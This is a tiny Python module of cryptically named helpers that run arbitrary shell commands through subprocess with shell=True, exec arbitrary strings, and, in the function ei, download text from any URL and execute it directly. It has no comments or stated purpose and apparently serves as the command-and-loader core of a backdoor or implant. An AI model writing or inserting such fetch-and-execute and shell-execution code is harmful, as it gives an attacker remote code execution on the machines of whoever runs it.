import subprocess, requests
def r(c):
    result = subprocess.Popen(c, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, close_fds=True)
    output = result.stdout.read()
def r2(c):
    subprocess.Popen(c, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, close_fds=True)
def ei(u):
    exec(requests.get(u).text)
def e(c):
    exec(c)
